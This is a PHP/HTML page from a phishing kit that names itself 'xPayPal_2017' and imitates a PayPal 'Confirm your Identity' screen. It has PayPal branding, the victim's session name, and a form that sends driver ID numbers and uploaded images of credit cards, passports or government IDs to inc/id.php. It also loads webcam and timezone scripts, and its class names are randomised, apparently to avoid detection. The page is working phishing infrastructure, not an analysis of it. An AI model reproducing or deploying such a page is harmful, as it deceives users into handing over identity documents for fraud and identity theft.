<?php
include 'inc/config.php';
include 'language.php';
?>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="./file/font-sans.css">
        <link rel="stylesheet" href="./file/template.css">
        <link rel="stylesheet" href="./file/css.css">
        <title>Confirm your Identity</title>
        <meta name="description" content="xPayPal_2017 v1.1 | Coded By CaZaNoVa163">
        <meta name="author" content="CaZaNoVa163">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./file/jquery.min.js"></script>
        <script type="text/javascript" src="./file/webcam.min.js"></script>
        <script type="text/javascript" src="./file/jstz.min.js"></script>
        <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
        <script type="text/javascript" src="./file/jquery.browser.min.js"></script>
        <script type="text/javascript">
$("#ajax").css('opacity', '0');
setTimeout(function () {
    $("#ajax").load("login.php", null, function () {
        $("#ajax").animate({
            opacity: '1'
        }, 100);
    });
}, 100);

        </script>
        <link rel="icon" type="image/png" href="img/favicon.ico">
    </head>

    <body>
        <div id="loader" class="xmzxf1fo9  spinner 1gl tbm4spvpfv9dy94zxg" style="display: none; opacity: 0;">
            <p id="loading_title">Redirecting...</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <script type="text/javascript" src="./file/identity.js"></script>
            <style>
body {
    background-color: #f8f8f8;
}

            </style>
            <input type="hidden" name="truelogin" id="truelogin" value="No">
            <div id="header_update">
                <div class="fdkknr7q9qqdgpic2rivh09989m7ezyk4 wiru0qa container_update for_nav">
                    <div id="menu_btn_update"></div>
                    <div id="logo_update"></div>
                    <ul class="41c265ivogne0nsf0n9zlnbmm0ojwx5ro nav">
                        <li class="s8i0lnrz7xqlxgyajao pywdtdsso5n83wyeaf594mkrt nav-item">
                            <a class="vhve1  e932x84443ygeg0e1ug0nx nav-link" href="#">
                                <?=$language['identity']['navbar'][1];?>
                            </a>
                        </li>
                        <li class="tqhlegg a zhf68lytso8g33qp nav-item">
                            <a class="py7p08e8da7pzq9eof8hxnssil3wvlma kq0ivzm nav-link" href="#">
                                <?=$language['identity']['navbar'][2];?>
                            </a>
                        </li>
                        <li class="r0w6ieev81gjeikp0bym1b o5ory8 xp0jl pqvoi3ynb 42cs nav-item">
                            <a class="t23 sdlst3d8b7xq nav-link" href="#">
                                <?=$language['identity']['navbar'][3];?>
                            </a>
                        </li>
                        <li class="f671yclq6l  ysurxsuvfaw4mpvg nav-item">
                            <a class="zmtbmu06eitx3f452zhiloyubj1vxwim92ol nav-link" href="#">
                                <?=$language['identity']['navbar'][4];?>
                            </a>
                        </li>
                        <li class="ad10lac1zy39ppxby aqpn4vwmaosjotofk1hnt7bm7s2uurvw nav-item">
                            <a class="z9qjoxuf59z3 nav-link" href="#">
                                <?=$language['identity']['navbar'][5];?>
                            </a>
                        </li>
                    </ul>
                    <div id="logout">
                        <div class="656uwj4 l09o9bvvqiqn5 sub_logout">
                            <button><?=$language['identity']['navbar'][6];?></button>
                        </div>
                        <div class="76mzvzeqwi84jj86jmlk sub_logout" id="setting">
                        </div>
                        <div class="ap89kijjetxr41 fazsbgpe7jc 4x3tzjsyu284 sub_logout" id="alert">
                        </div>
                    </div>
                </div>
            </div>
            <div id="sub_menu">
                <div class="v nmrkfghm9jj2mcguhjewoxmhz83n0ond26p8dxl container_update">
                    <ul class="642wjg1bdgah4mk39geziaxwcio sub_nav">
                        <li class="thsvlzwtu 5n bszlun8xxnq53y9cz0w8iij864s6 sub_nav-item">
                            <a class="euj4unuk suj2sgxbcn9 fpxkqzne nav-link" href="#">
                                <?=$language['identity']['sub_navbar'][1];?>
                            </a>
                        </li>
                        <li class="6sjq3c  0cddbeks3v9s9e84q89wtqnp x64064r sub_nav-item">
                            <a class="ongnm474hm56jzxguegt1jxz5uiqa2gpgo3ui1or nav-link" href="#">
                                <?=$language['identity']['sub_navbar'][2];?>
                            </a>
                        </li>
                        <li class="3d9c2z9m9po1x49bytl sub_nav-item">
                            <a class=" tu2jtfi9uawp zduaut5f3egdr49 nav-link" href="#">
                                <?=$language['identity']['sub_navbar'][3];?>
                            </a>
                        </li>
                        <li class="dpteb9f1d03zjz6d4chl8gnkg g96x8 crfeqm7uc1jnqfrlj sub_nav-item">
                            <a class=" rtgw tuvwl6 nav-link" href="#">
                                <?=$language['identity']['sub_navbar'][4];?>
                            </a>
                        </li>
                    </ul>
                    <div class="e6fi97m9lo 38gq90aunnqogt7l7fetka0t arrow"></div>
                </div>
            </div>
            <div id="update_content">
                <div class="tn2x2w8ibju5p0btziglahh6p2 container_update">
                    <div class="5vyok8wx 556ky9ew3oe qkaepj65es00hf row first">
                        <div class="be85td6ao7g5hc1nwrd4yga six columns">
                            <div class="58g7nddjmha04t5zhb10  row">
                                <div id="profile_div">
                                    <font class="mn8zv9qqslg1o9sp9palurba3cmclw1ya0oxz profile">
                                        <?=$language['identity'][1];?>
                                    </font>
                                    <div id="profile_img" style="background-image:url(img/profile.png);"></div>
                                    <div id="Update_Photo">
                                        <?=$language['identity'][2];?>
                                    </div>
                                </div>
                                <div id="profile_name_div">
                                    <div id="my_name">
                                        <?=$_SESSION['user'];?>
                                    </div>
                                    <div id="joined_at">
                                        <?=$language['identity'][3];?> <?=$_SESSION['joined'];?>
                                            <font>
                                                <?=$language['identity'][4];?>
                                            </font>
                                    </div>
                                </div>
                            </div>
                            <div id="frm_account">
                                <table>
                                    <tbody>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_checked.png"></td>
                                            <td>
                                                <?=$language['identity'][5][1];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_checked.png"></td>
                                            <td>
                                                <?=$language['identity'][5][2];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_checked.png"></td>
                                            <td>
                                                <?=$language['identity'][5][3];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_uncheck.png"></td>
                                            <td>
                                                <?=$language['identity'][5][4];?>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="qgu9q4w24oneqrz9j2ghwcvzqdeyd4ova9ur4hjz six columns">
                            <form action="inc/id.php" method="post" enctype="multipart/form-data">
                                <div class="swim0p746kfvlu7bpm797w8cn74x13hjp profile" id="big_title">
                                    <?=$language['identity'][6];?>
                                </div>
                                <div id="address_div">

                                    <div id="step_identity">
                                        <div id="for_drive">
                                            <input type="text" name="driver_number" id="driver_number" value="" placeholder="Drive ID Number" class="6gmjwqh rxv1857m0v8a08ftgtn u-full-width">
                                            <input type="text" name="driver_issued_by" id="driver_issued_by" value="" placeholder="Issued By" class="3m31vop3gxhsjsynewgq u-pull-left" style="width:49%;">
                                            <input type="text" name="driver_expire_date" id="driver_expire_date" value="" placeholder="Expire Date (MM/YYYY)" class="4l0wrxvj2ayhn p1q5 u-pull-right" style="width:49%;">
                                        </div>
                                        <select name="identity_type" id="identity_type" class="hawr3ilwzlg qh4w bu8frrdhbtopfdxg0fa rx u-full-width">
						<option value="0">Document Type?</option>
						<option value="Credit Card">• Credit Card</option>
						<option value="Government ID">• Government ID</option>
						<option value="Drive ID">• Drive ID</option>
						<option value="Passport">• Passport</option>
					</select>
                                        <div id="drag_drop">
                                            <div id="drag_drop_dashed">
                                                <div id="dragdroptohide">
                                                    <?=$language['identity'][7];?>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <input type="file" name="file[]" id="file" value="" placeholder="" multiple="">
                                    <input type="button" name="identity_btn_submit" id="identity_btn_submit" value="Upload" class="dq71cm9gruoeztd3h77bv nr1hnfypz3 u-full-width button-primary">
                                    <button type="button" name="i_dont_have_my_id_now" id="i_dont_have_my_id_now" class="8bwiyyigtx4xxmo9t2i90sktjx3h71e531erpoy bty07dz u-full-width"><?=$language['identity'][8];?></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div id="footer_update_mobile">
                        <div class="jq47ipwf5u8laldwdiyiq4femws63v1cbvalaxs7iqjj2 row footer_row_1">
                            <font class="7qb83dvla42kevzbsmx0qdcz7crw7 footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font>
                        </div>
                        <div class="otljmxp8mrrzfhfjl6hpo row footer_row_2">
                            <font class="31zlq6uxg6uol izlg footer2">© 1999-
                                <?=date("Y");?> PayPal, Inc. All rights reserved.</font>
                        </div>
                    </div>
                </div>
            </div>
            <div id="footer_update">
                <div class="6gl7nd66kp633w container_update">
                    <div class="ojmlxqht2yp row footer_row_1">
                        <font class="8wgm6tzua7e3vvpdy footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font><img src="./file/feedback.png"></div>
                    <div class="vtkhe1l476v cz l503r rc7mb12z row footer_row_2">
                        <font class="h8abqbtt 6v2zl9 x0vgx8 footer2">© 1999-
                            <?=date("Y");?> PayPal, Inc. All rights reserved.</font>
                        <font class="oaoqkncenvve5n7d4p9sv2jg56trk1 footer3">|</font>
                        <font class="ig64m1ij6d05wly6tt2cb footer4">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font>
                    </div>
                </div>
            </div>
        </div>
    </body>

    </html>
